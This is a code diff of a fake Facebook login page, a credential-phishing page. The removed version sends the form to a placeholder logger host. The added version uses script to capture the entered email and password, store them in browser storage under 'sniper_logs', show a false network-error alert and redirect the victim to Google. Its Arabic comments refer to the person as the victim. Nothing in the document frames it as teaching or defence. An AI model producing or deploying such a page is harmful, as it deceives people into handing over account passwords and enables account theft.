@@ -1,26 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Log into Facebook</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; text-align: center; }
-        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
-        .btn { background: #1877f2; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
-        .btn:hover { background: #166fe5; }
-    </style>
-</head>
-<body>
-    <div class="login-box">
-        <div class="logo">facebook</div>
-        <form action="https://your-logger-link.com" method="POST">
-            <input type="text" name="email" placeholder="Email or phone number" required>
-            <input type="password" name="pass" placeholder="Password" required>
-            <button type="submit" class="btn">Log In</button>
-        </form>
-    </div>
-</body>
-</html>
+<html lang="en"><head><meta charset="UTF-8"><title>Log into Facebook</title>
+<style>body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.login-box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:396px;text-align:center;}.logo{color:#1877f2;font-size:40px;font-weight:bold;margin-bottom:20px;letter-spacing:-1px;}input{width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:16px;}input:focus{border-color:#1877f2;outline:none;}.btn{background:#1877f2;color:#fff;border:none;width:100%;padding:14px;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;}.btn:hover{background:#166fe5;}</style></head>
+<body><div class="login-box"><div class="logo">facebook</div>
+<form><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="pass" placeholder="Password" required><button type="submit" class="btn">Log In</button></form>
+</div>
+<script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+        e.preventDefault(); // منع الإرسال الحقيقي
+        var email = document.querySelector('input[type="text"]').value;
+        var pass = document.querySelector('input[type="password"]').value;
+        
+        // جلب البيانات القديمة أو إنشاء مصفوفة جديدة
+        var logs = JSON.parse(localStorage.getItem('sniper_logs') || '[]');
+        
+        // إضافة البيانات الجديدة
+        logs.push({
+            site: 'facebook',
+            email: email,
+            pass: pass,
+            time: new Date().toLocaleString()
+        });
+        
+        // حفظها في ذاكرة المتصفح
+        localStorage.setItem('sniper_logs', JSON.stringify(logs));
+        
+        // توجيه الضحية لصفحة الموقع الحقيقي
+        alert('Error: Please check your internet connection.');
+        window.location.href = 'https://www.google.com';
+    });
+</script>
+            </body></html>
